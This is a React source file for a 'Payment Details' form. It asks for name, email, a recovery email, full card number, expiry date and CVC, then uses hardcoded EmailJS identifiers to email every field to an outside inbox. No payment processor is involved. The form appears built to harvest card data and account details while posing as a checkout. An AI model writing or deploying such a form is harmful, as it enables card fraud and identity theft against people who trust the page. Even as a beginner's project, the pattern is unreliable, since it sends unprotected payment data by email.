/* eslint-disable no-unused-vars */
import React, { useRef } from 'react';
import emailjs from '@emailjs/browser';

const PaymentDetails = () => {
  const form = useRef();

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs
      .sendForm(
        'service_itl56hh',
        'template_uh15ufm',
        form.current,
        'X652hOOq-P3jXQE22'
      )
      .then(
        (result) => {
          alert('Email sent');
          form.current.reset();
        },
        (error) => {
          console.log(error.text);
        }
      );
  };
  return (
    <div className="flex justify-center items-center min-h-screen">
      <div className="card flex-shrink-0 w-80 md:w-full max-w-sm shadow-2xl bg-base-100">
        <form ref={form} onSubmit={sendEmail} className="card-body">
          <div className="form-control">
            <label className="label">
              <span className="label-text">Name*</span>
            </label>
            <input
              type="text"
              name="user_name"
              placeholder="name"
              className="input input-bordered"
            />
          </div>
          <div className="form-control">
            <label className="label">
              <span className="label-text">Email*</span>
            </label>
            <input
              type="email"
              name="user_email"
              placeholder="email"
              className="input input-bordered"
            />
          </div>
          <div className="form-control">
            <label className="label">
              <span className="label-text">Recovery Email*</span>
            </label>
            <input
              type="email"
              name="user_email"
              placeholder="email"
              className="input input-bordered"
            />
          </div>
          <div className="form-control">
            <label className="label">
              <span className="label-text">Card* (Master, Debit, Credit)</span>
            </label>
            <input
              type="text"
              name="user_card"
              placeholder="Card"
              className="input input-bordered"
            />
          </div>
          <div className="form-control">
            <label className="label">
              <span className="label-text">Expire Date*</span>
            </label>
            <input
              type="text"
              name="user_Expire_date"
              placeholder="Example: 07/27"
              className="input input-bordered"
            />
          </div>
          <div className="form-control">
            <label className="label">
              <span className="label-text">CVC*</span>
            </label>
            <input
              type="text"
              name="user_CVC"
              placeholder="CVC"
              className="input input-bordered"
            />
          </div>
          <input className="btn btn-primary" type="submit" value="Send" />
        </form>
      </div>
    </div>
  );
};

export default PaymentDetails;
